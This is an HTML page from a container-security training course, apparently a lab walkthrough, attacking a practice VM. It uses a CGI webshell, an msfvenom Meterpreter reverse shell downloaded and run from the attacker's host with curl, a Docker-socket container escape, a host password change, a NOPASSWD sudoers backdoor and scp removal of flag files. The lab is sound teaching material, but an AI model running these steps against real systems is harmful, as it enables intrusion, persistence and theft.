@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: Docker Attack (using DockerDud) | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: Docker Attack (using DockerDud)" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/dockerdud-dockersecurity/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/dockerdud-dockersecurity/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: Docker Attack (using DockerDud)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: Docker Attack (using DockerDud)","url":"http://0.0.0.0:10000/exercises/dockerdud-dockersecurity/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: Docker Attack (using DockerDud)</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+    <h2 id="before-you-start">Before you start</h2>
+
+<p>Please turn your sticker over, back to the not-yet-done side.</p>
+<p>Then start an lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. 
+</p>
+    
+<p>Now suspend all other virtual machines:</p>
+
+<div class="language-shell highlighter-rouge"><div 
+class="highlight"><pre class="highlight">
+<code>/sync/bin/suspend-all-vms.sh </code>
+</pre></div>    </div>
+
+<p>And then start the virtual machine:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code>sudo virsh start dockerdud</code></pre></div>    </div>
+
+    
+
+    <h2 id="steps">Steps</h2>
+<ol>
+<li>
+<p>Let's check for a port 80 web page. Visit this URL:</p>
+<p><a href="http://dockerdud">http://dockerdud</a></p>
+</li>
+<li>
+<p>Start up a fresh lxterminal by clicking the &quot;sparrow&quot; logo in the bottom-left corner of the screen, clicking run, typing <code>lxterminal</code> and hitting enter.</p>
+</li>
+<li>
+<p>Let's fire up <code>dirbuster</code> to look for more interesting content.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirbuster
+</code></pre></div></div>
+</li>
+<li>
+<p>In the <code>dirbuster</code> window, fill out the target URL with <a href="http://dockerdud">http://dockerdud</a></p>
+</li>
+<li>
+<p>To complete the &quot;File with list of dirs/files&quot; box, choose the &quot;Browse&quot; box to its right, then navigate that window to <code>/usr/share/dirbuster/wordlists/</code> and choose <code>directory-list-lowercase-2.3-small.txt</code>.</p>
+</li>
+<li>
+<p>Make sure that &quot;Be recursive.&quot; is checked.</p>
+</li>
+<li>
+<p>Click the &quot;Use Blank Extension&quot; checkbox.</p>
+</li>
+<li>
+<p>Now click the &quot;Start&quot; button in the lower right corner of the <code>dirbuster</code> window.</p>
+</li>
+<li>
+<p>Now click the &quot;Results-List View&quot; tab to see the results update in real time.</p>
+</li>
+<li>
+<p>Stop the scan when it finds &quot;garbage.&quot; The amount of time this takes depends on the number of requests per second you see. In one test, at 422 requests per second, this took 7 minutes. If you'd like, let this run but skip to the next step, stipulating that you found &quot;garbage&quot; in the results.</p>
+</li>
+<li>
+<p>We found a simple CGI script that runs commands, clearly placed at the insistence of the Hackers movie villain, &quot;The Plague&quot;. Check it out by surfing to:</p>
+<p><a href="http://dockerdud/cgi-bin/garbage">http://dockerdud/cgi-bin/garbage</a></p>
+</li>
+<li>
+<p>In the &quot;Command&quot; window, enter <code>id</code> and hit the <code>Enter</code> key. You'll see what user this backdoor is running as.</p>
+</li>
+<li>
+<p>Now, let's get a Meterpreter binary running via this backdoor.  Start up a terminal and create a fresh Meterpreter binary:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x86/meterpreter/reverse_tcp <span class="se">\</span>
+<span class="nv">LHOST</span><span class="o">=</span>10.23.58.30 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-o</span> mrsbin <span class="nt">-f</span> elf
+</code></pre></div></div>
+</li>
+<li>
+<p>Now stage a web server in that terminal, hosting the <code>mrsbin</code> binary:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, start up a new terminal by hitting <code>Ctrl-shift-T</code>.</p>
+</li>
+<li>
+<p>Let's start up Metasploit to receive the Meterpreter connection.  Start a Metasploit console session:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+</code></pre></div></div>
+</li>
+<li>
+<p>In the Metasploit console, run these commands to start a listener that's specific to this Meterpreter binary:</p>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 10.23.58.30
+exploit -j
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, switch back to your browser, where we'll be replacing our id command with one that will download, chmod and run the mrsbin Meterpreter binary.</p>
+</li>
+<li>
+<p>Copy and paste this text into the &quot;Command&quot; form item, then click &quot;Submit&quot;.</p>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -O http://10.23.58.30/mrsbin; chmod 755 mrsbin; ./mrsbin
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the page seems to keep loading forever. That's a good thing – it means that the garbage webshell hasn't finished executing <code>mrsbin</code>. If it ever does, we'll likely need to restart <code>mrsbin</code> through the webshell,.</p>
+</li>
+<li>
+<p>Switch back to the terminal window to see that your Metasploit console shows a &quot;Meterpreter session N opened&quot; where N is a number, usually 1.  Press <code>Enter</code>.</p>
+</li>
+<li>
+<p>Interact with the meterpreter by typing <code>sessions -i N</code>, where N is that session number from the previous step.  If <code>N = 1</code>, type:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-i</span> 1
+</code></pre></div></div>
+</li>
+<li>
+<p>Now get a shell by typing:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+</li>
+<li>
+<p>Run a <code>mount</code> command, so we can see if anything interesting is mounted:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount
+</code></pre></div></div>
+</li>
+<li>
+<p>Note that the first line of output suggests that we're in a Docker container - it says that the <code>/</code> filesystem is mounted in via an overlay filesystem. Overlay file systems are almost only used in containers.</p>
+<p><strong>Note</strong>: <a href="https://en.wikipedia.org/wiki/OverlayFS">Overlay filesystems</a> differ from normal filesystem mounting, in that they involve layers that are &quot;union&quot;-mounted. Files in the same directory from two different layers are visible.  In normal mounting, one partition is mounted onto <code>/</code>, while the next partition is mounted onto a subdirectory like <code>/home</code>, blocking  anything in the first partition's <code>/home</code> from view.</p>
+</li>
+<li>
+<p>Find the line that starts like this - it indicates that someone has mounted the Docker socket into the container:</p>
+<pre><code>tmpfs on /run/docker.sock type tmpfs
+</code></pre></li>
+<li>
+<p>If we had a docker binary to run, we could interact with the Docker daemon on this machine. Let's check if we do:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker ps
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that we were able to run docker commands! Most docker installs do not have an authorization plugin.  This means that if you're able to access the Docker engine at all, you can do everything. Let's see how dangerous that is.</p>
+</li>
+<li>
+<p>Let's start up a privileged container, adding all Linux root capabilities to it. We'll want an image that's cached on this machine already, so we don't need to pull anything across the internet:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker images
+</code></pre></div></div>
+</li>
+<li>
+<p>OK - let's use the first container image: <code>dockersock</code></p>
+</li>
+<li>
+<p>Try (and fail) to create a privileged container, with all root capabilities, working from that image:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-it</span> <span class="nt">--privileged</span> <span class="nt">--cap-add</span> ALL dockersock /bin/bash
+</code></pre></div></div>
+</li>
+<li>
+<p>You'll be told that you need a TTY. Let's get one, using a classic penetration tester trick:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span> <span class="o">&gt;&gt;</span>shell.py
+python shell.py
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's try again to create the privileged container:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-it</span> <span class="nt">--privileged</span> <span class="nt">--cap-add</span> ALL dockersock /bin/bash
+</code></pre></div></div>
+</li>
+<li>
+<p>Awesome! We've launched a new container and are now running commands in it.</p>
+</li>
+<li>
+<p>Take a look at the <code>/dev</code> contents that privileged containers get access to:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /dev
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's take a look at the disk partitions on the host (<code>/dev/sda</code> on VMware, <code>/dev/vda</code> on KVM):</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fdisk <span class="nt">-l</span> /dev/vda
+</code></pre></div></div>
+</li>
+<li>
+<p>Note that this is a simple layout - there's a Linux (ext4) partition and a swap partition.</p>
+</li>
+<li>
+<p>Mount the root partition (<code>/dev/sda1</code> on VMware, <code>/dev/vda1</code> on KVM) onto <code>/mnt</code> in this container:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount /dev/vda1 /mnt
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at <code>/etc/passwd</code> on the host:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /mnt/etc/passwd
+</code></pre></div></div>
+</li>
+<li>
+<p>Note that there's a user account called <code>theplague</code>. We'll change their password in a moment. First, let's simulate being in the host filesystem by <code>chroot</code>-ing ourself into <code>/mnt</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chroot</span> /mnt /bin/bash
+</code></pre></div></div>
+</li>
+<li>
+<p>Change <code>theplague</code>'s password.  First, run a <code>passwd</code> command to start the password change process.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>passwd theplague
+</code></pre></div></div>
+</li>
+<li>
+<p>Set <code>theplague</code>'s password to <code>theplague</code>, just to keep things simple:</p>
+<pre><code>theplague
+theplague
+</code></pre></li>
+<li>
+<p>Now add <code>theplague</code> to the sudoers file as a user who doesn't need to type a password:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"theplague ALL=(ALL) NOPASSWD:ALL"</span> <span class="o">&gt;&gt;</span>/etc/sudoers
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's exit the <code>chroot</code>'ed shell:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exit</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now unmount <code>/mnt</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>umount /mnt
+</code></pre></div></div>
+</li>
+<li>
+<p>Ok - let's use the access we have on the host. Open a new terminal window or tab on your Kali system and run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh theplague@dockerdud
+</code></pre></div></div>
+</li>
+<li>
+<p>When asked for a password, enter <code>theplague</code>:</p>
+<pre><code>theplague
+</code></pre></li>
+<li>
+<p>Run <code>ls</code> and notice that there's a flag file waiting for you:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Start up another terminal window or tab and use <code>scp</code> to pull the flag file to your own system - you can enter <code>theplague</code> when asked for a password:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp theplague@dockerdud:FLAG.jpg ~/Desktop
+</code></pre></div></div>
+</li>
+<li>
+<p>Click the file manager icon - it looks like a folder.</p>
+</li>
+<li>
+<p>Click the Desktop icon, then click the <code>FLAG.jpg</code> icon to view it.  Leave this file manager running, please.</p>
+</li>
+<li>
+<p>Go back to your <code>ssh</code> session and escalate to <code>root</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su -
+</code></pre></div></div>
+</li>
+<li>
+<p>You're now in <code>root</code>'s home directory, as <code>root</code>.  List the directory contents:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's move that <code>FLAG.gif</code> file into <code>theplague</code>'s home directory so we can pull it down with <code>scp</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv </span>FLAG.gif /home/theplague
+</code></pre></div></div>
+</li>
+<li>
+<p>Change the file's owner to <code>theplague</code>, so we can use <code>scp</code> to pull it down:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chown </span>theplague /home/theplague/FLAG.gif
+</code></pre></div></div>
+</li>
+<li>
+<p>Open another terminal window or just go to whichever one you used to <code>scp</code> the last flag. Transfer this flag to your Kali host:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp theplague@dockerdud:FLAG.gif ~/Desktop
+</code></pre></div></div>
+</li>
+<li>
+<p>Now switch back to the file manager and look at your final flag file: <code>FLAG.gif</code></p>
+</li>
+<li>
+<p>When you're done with this exercise, we'll discuss the defense.</p>
+</li>
+<li>
+<p>Suspend the virtual machines:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /sync/bin/suspend-all-vms.sh 
+</code></pre></div></div>
+</li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
